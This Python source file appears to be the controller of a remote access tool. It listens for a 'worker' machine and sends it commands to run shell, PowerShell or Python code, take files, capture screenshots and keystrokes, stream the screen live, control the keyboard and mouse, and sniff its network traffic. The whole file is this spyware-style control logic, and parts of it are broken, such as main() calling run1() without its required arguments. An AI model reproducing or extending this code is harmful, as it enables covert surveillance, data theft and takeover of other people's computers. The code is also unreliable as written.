import socket
import time
import tkinter
from typing import Callable
import struct
import sys
import threading

import cv2
import keyboard
import numpy as np

Commend = Callable[[],bytes]

RETURN = False
# unneeded
def cmd() -> bytes:
    global RETURN
    commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
    check_return(commend)
    if RETURN:
        return b""
    return b"cmd:"+commend.encode()
# unneeded
def powershell()->bytes:
    global RETURN
    commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
    check_return(commend)
    if RETURN:
        return b""
    return b"powershell:"+commend.encode()
# unneeded
def python()->bytes:
    global RETURN
    print("enter your python code (end with an empty line) or enter \"return\" to return to menu: ")
    code = ""
    while True:
        line = sys.stdin.readline().strip()
        if not line:
            break
        check_return(line)
        if RETURN:
            return b""
        code += line + "\n"
    return b"python:"+code.encode()
# unneeded
def check_return(text:str):
    global RETURN
    if text == "return":
        RETURN = True

# unneeded
def receive_file() ->bytes:
    global RETURN
    file_path = input("enter the path of the file you want in the worker side or enter \"return\" to return to menu: ")
    check_return(file_path)
    if RETURN:
        return b""
    return b"receive_file:"+file_path.encode()

#unneeded
def send_file(file_path:str,name:bytes) ->bytes:
    try:
        with open(file_path, "rb") as file:
            file_bytes = file.read()
        if name == b"" or b"." not in name:
            return "error: please enter a valid name".encode()
        return name+b":"+file_bytes
    except FileNotFoundError:
        return f"error: file '{file_path}' does not exist.".encode()
    except PermissionError:
        return f"error: file '{file_path}' is not accessible (permission issue).".encode()
    except Exception as e:
        return f"error: {e}".encode()

# unneeded
def screen_shot() ->bytes:
    return b"screen_shot"
# unneeded
def exit_endless_print():
    msg = input("enter \"return\" to return to menu")
    check_return(msg)
# unneeded
def listen_to_keys()->bytes:
    return b"listen_to_keys"


#unneeded
def live_stream() -> bytes:
    return b"live_stream"

def press_key_in_worker() -> bytes:
    global RETURN
    print("every key you press will be pressed in worker, enter ctrl+q to quit to menu")
    while True:

        event = keyboard.read_event()
        if event.event_type == "down":
            if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
                RETURN = True
                return b""
            else:
                return b"press_key_in_worker:" + event.name.encode()

def control_mouse() -> bytes:
    global RETURN
    print("enter mouse parameters(you can enter \"return\" at any time to return to menu):")
    x = input("horizontal coordinate: ")
    check_return(x)
    if RETURN:
        return b""
    while not x.isdigit():
        x = input("please enter a number ")
    y = input("vertical coordinate: ")
    check_return(y)
    if RETURN:
        return b""
    while not y.isdigit():
        y = input("please enter a number ")
    button = input("which button do you want to press: ")
    check_return(button)
    if RETURN:
        return b""
    while button != "left" and button!="right":
        button = input("please enter left or right ")
    return b"control_mouse:"+x.encode()+b":"+y.encode()+b":"+button.encode()

# unneeded
def sniff_from_worker() ->bytes:
    print("please enter parameters(you can enter \"return\" at any time to return to menu):")
    scapy_filter = input("enter your filter for the sniffing: ")
    check_return(scapy_filter)
    if RETURN:
        return  b""
    scapy_time = input("enter how much you want the sniffing to continue:")
    check_return(scapy_time)
    if RETURN:
        return  b""
    while not scapy_time.isdigit():
        scapy_time = input("please enter a valid time  in numbers")
    scapy_amount = input("enter how much packets you want to sniff: ")
    check_return(scapy_amount)
    if RETURN:
        return  b""
    while not scapy_amount.isdigit():
        scapy_amount = input("please enter a valid time  in numbers")
    return b"sniff_from_worker:" + scapy_filter.encode() + b":" + scapy_time.encode() + b":" + scapy_amount.encode()

# unneeded
def save_file(received:bytes):
    file_name = input("how do you want to save your file?")
    while file_name == "" or "." not in file_name:
        file_name = input("please enter a valid name")
    with open(file_name,"wb") as file:
        file.write(received)





class Master:
    def __init__(self, ip:str, port:int):
        self.address = (ip,port)
        self.server = socket.socket()
        self.server.bind(self.address)
        self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
        self.exit:bool = False
        self.streaming = False
        self._sock_lock = threading.RLock()
        self.on_stream_stop = None
        self.control_key = False



    def connect(self):
        self.server.listen()
        self.client = self.server.accept()[0]
        print(self.client.recv(1024).decode())

    def recvall(self, size: int) -> bytes:
        data = b""
        while len(data) < size:
            packet = self.client.recv(size - len(data))
            if not packet:
                return b""
            data += packet
        return data

    def receiver(self) -> bytes:
        raw_size = self.recvall(4)
        if not raw_size:
            return b""
        size = struct.unpack("I", raw_size)[0]
        if size == 0:
            return b""
        message = self.recvall(size)
        return message

    def sender(self,message:bytes):
        data = struct.pack("I",len(message))+message
        self.client.sendall(data)

    def control_keys(self):
        while True:
            if self.control_key:
                with self._sock_lock:
                    self.sender(b"listen_to_keys")

                event = keyboard.read_event()
                if event.event_type == "down":
                    if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
                        self.control_key = False
                        continue
                    else:
                        return b"press_key_in_worker:" + event.name.encode()

    def show_stream(self):
            global RETURN
            root = tkinter.Tk()
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            root.destroy()
            while True:
                if self.streaming:
                    with self._sock_lock:
                        self.sender(b"live_stream")
                        frame_data = self.receiver()

                    if not frame_data:
                        time.sleep(0.05)
                        continue

                    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
                    if frame is None:
                        time.sleep(0.005)

                        continue

                    h, w, _ = frame.shape
                    scale = min(screen_width / w, screen_height / h)
                    new_w, new_h = int(w * scale), int(h * scale)
                    resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
                    canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
                    x_offset = (screen_width - new_w) // 2
                    y_offset = (screen_height - new_h) // 2
                    canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized

                    cv2.imshow("Live Stream", canvas)

                    key = cv2.waitKey(1)

                    if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
                        print("Window closed, stopping video loop...")
                        self.streaming = False
                        if self.on_stream_stop:
                            self.on_stream_stop()
                        continue

                    if key == ord("q"):
                        print("Pressed 'q', stopping video loop...")
                        self.streaming = False
                        if self.on_stream_stop:
                            self.on_stream_stop()
                        continue
                    time.sleep(0.001)

                else:
                    try:
                        cv2.destroyWindow("Live Stream")
                    except cv2.error:
                        # window didn't exist → safe to ignore
                        pass
                    time.sleep(0.1)

            RETURN = True
            cv2.destroyAllWindows()


    def menu(self) ->str:
        print("which action do you want to do? ")
        i = 1
        for key in self.functions.keys():
            print(f"{i}: {key}")
            i+=1
        print(f"{len(self.functions.keys())+1}: quit")
        action = input("enter action name: ").replace(" ","_")
        while action not in self.functions.keys() and action != "quit":
            action = input("enter a valid name: ").replace(" ","_")
        return action


    def run2(self,function:str, message:bytes) -> bytes:
        if function == "quit":
            self.sender("quit".encode())
            self.server.close()
            self.client.close()
            return "exited the worker".encode()
        if function == "send_file":
            splitted = message.decode().split(":")
            message = send_file(splitted[0],splitted[1].encode())
        if b"error:" in message:
            return message
        with self._sock_lock:
            self.sender(function.encode() + b":" + message)
            received = self.receiver()
        return received

    def run1(self,function:str,message:str):
        global RETURN
        self.connect()
        while function !="quit":
            if function == "listen_to_keys":
                t = threading.Thread(target=exit_endless_print, daemon=True)
                t.start()
                while not RETURN:
                    self.sender(message.encode())
                    received = self.receiver().decode()
                    if received:
                        print(received)
            if RETURN:
                RETURN = False
                function = self.menu()
                continue
            self.sender(message.encode())
            if function == "live_stream":
                self.show_stream()
                continue

            received = self.receiver()
            if b"error" == received[:5]:
                print(received.decode())
            elif function in ["receive_file","screen_shot"]:
                save_file(received)
                if function == "screen_shot":
                    function = self.menu()
                    continue
            elif function == "sniff_from_worker":
                name = input("enter input for file name(without extension)")
                while "." in name:
                    name = input("I said without extension")
                with open(name+".pcap","wb") as file:
                    file.write(received)
                    print("saved packets successfully")
            else:
                print(received.decode())
        self.sender("quit".encode())
        self.server.close()
        self.client.close()



def main():
    functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
    master = Master("10.0.0.3",5555)
    master.run1()

if __name__ == '__main__':
    main()